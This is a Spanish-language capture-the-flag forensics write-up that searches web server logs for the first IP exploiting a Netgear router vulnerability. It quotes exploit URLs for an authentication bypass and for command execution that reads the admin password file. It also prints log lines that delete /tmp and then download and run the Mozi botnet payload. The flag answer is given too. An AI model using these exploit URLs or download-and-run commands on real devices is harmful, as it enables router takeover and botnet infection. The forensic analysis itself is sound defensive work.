Logs
====

Challenge

> Could you find the first IP address that tried to exploit the vulnerability discovered by Roberto Paleari?
>
> FLAG format: EKO{IP}
>
> Attachment
> [Logs](https://github.com/estebancano-dev/CTF-Writeups/blob/master/20200626%20Ekoparty%20Pre-CTF/Files/Logs?raw=true)

Category: Forensics

Inicio clásico...

    $ file logs.gz
    Logs: gzip compressed data, was "logs", last modified: Fri Aug 14 15:54:55 2020, from Unix, original size 648140
    $ mv Logs logs.gz
    $ gunzip logs.gz

Es un archivo de Logs HTTP con un montón de IPs

    $ cat logs | cut -f1 -d' ' | sort | uniq -c | sort -n > ips.txt
    $ wc -l ips.txt
    374 ips.txt (distintas)
    $ head -3 ips.txt
        1 100.35.135.237
        1 101.95.184.210
        1 102.165.30.21
    $ tail -3 ips.txt
        280 44.225.84.206
        936 223.100.160.5
        954 203.160.55.115
    $

El Sr. Roberto Paleari ([@rpaleari](https://twitter.com/rpaleari))
ha descubierto un montón de vulns. Hay de iOS creo, y de SNMP, pero de snmp
no parecerían ser, pues el log es de webserver.

Mi novia encontró que había descubierto también vulnerabilidades en
equipos de Netgear (dispositivos de red), así que vamos por esas ...

- 29/03/2013 Authentication bypass on Netgear WNR1000 ()  
  <https://www.exploit-db.com/exploits/24916>

> Strictly speaking, the web server skips authentication checks for some URLs,
> such as those that contain the substring ".jpg" (without quotes). As a
> consequence, an attacker can retrieve the current device configuration by
> accessing the following URL:
>
> `http://<target-ip-address>/NETGEAR_fwpt.cfg?.jpg`
>
> The resulting configuration file is encrypted. However the device implements a
> trivial encryption scheme, that can be reversed quite easily.  From the
> configuration file, attackers can extract, among the other things, the
> clear-text password for the "admin" user.

Así que ".jpg", eh?

    $ grep -i netgear logs | fgrep -i ".jpg"
    $

(nope, ninguna)

Busquemos otra...

- Netgear DGN1000 / DGN2200 - Multiple Vulnerabilities  
  31/05/2013 Unauthenticated command execution on Netgear DGN devices ()  
  <https://www.exploit-db.com/exploits/25978>

> Briefly, the embedded web server skips authentication checks for some URLs
> containing the "currentsetting.htm" substring. As an example, the following URL
> can be accessed even by unauthenticated attackers:
>
> `http://<target-ip-address>/setup.cgi?currentsetting.htm=1`
>
> Then, the "setup.cgi" page can be abused to execute arbitrary commands. As an
> example, to read the /www/.htpasswd local file (containing the clear-text
> password for the "admin" user), an attacker can access the following URL:
>
> `http://<target-ip-address>/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1`
>
> Basically this URL leverages the "syscmd" function of the "setup.cgi" script to
> execute arbitrary commands. In the example above the command being executed is
> "cat /www/.htpasswd", and the output is displayed in the resulting web
> page. Slightly variations of this URL can be used to execute arbitrary
> commands.

Entonces...

    $ grep -i netgear logs | fgrep -i "current" --color
    207.136.9.198 - - [02/Aug/2020:15:38:47 -0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 400 0 "-" "Mozilla/5.0"
    114.227.134.250 - - [08/Aug/2020:16:13:10 -0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
    223.149.48.170 - - [12/Aug/2020:22:22:10 -0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
    $

Bueno, estas sí tienen buena pinta.
Nos quedamos con la primera IP: `207.136.9.198`

El formato de la flag es EKO{IP}

Flag

    EKO{207.136.9.198}

-- [maurom](https://maurom.com/)

---

Otras posibles alternativas (no probadas)

- https://packetstormsecurity.com/files/author/8921/
- https://www.huawei.com/nl/psirt/security-advisories/2015/hw-260601
- https://www.huawei.com/nl/psirt/security-advisories/2015/hw-260626
- Paper: https://link.springer.com/chapter/10.1007/978-3-540-70542-0_7 (leer!)
